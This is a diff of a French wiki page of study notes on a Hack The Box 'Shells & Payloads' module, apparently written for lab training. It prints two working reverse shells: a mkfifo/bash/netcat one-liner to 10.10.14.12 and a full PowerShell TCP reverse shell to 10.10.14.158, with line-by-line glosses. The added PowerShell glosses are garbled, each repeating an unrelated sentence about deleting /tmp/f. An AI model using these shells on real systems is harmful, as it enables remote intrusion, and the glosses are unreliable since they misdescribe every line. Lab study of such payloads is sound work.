@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:47:57.068Z
+date: 2025-05-17T19:51:25.569Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -181,13 +181,13 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
 1. **`rm -f /tmp/f;`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
 
-2. **`mkfifo /tmp/f;`**
+1. **`mkfifo /tmp/f;`**
    Crée un fichier [pipe nommé (FIFO)](https://man7.org/linux/man-pages/man7/fifo.7.html).
 
-3. **`cat /tmp/f |`**
+1. **`cat /tmp/f |`**
    Concatène le fichier nommé **/tmp/f** (un FIFO), et transmet sa sortie via un pipe à la commande suivante.
 
-4. **`/bin/bash -i 2>&1 |`**
+1. **`/bin/bash -i 2>&1 |`**
 		Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).
 
 5. **`nc 10.10.14.12 7777 > /tmp/f`**
@@ -199,3 +199,32 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+1. **`powershell -nop -c `**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+   
+1. **`"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`$stream = $client.GetStream();`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`[byte[]]$bytes = 0..65535|%{0};`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`$sendback = (iex $data 2>&1 | Out-String );`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+1. **`$client.Close()"`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
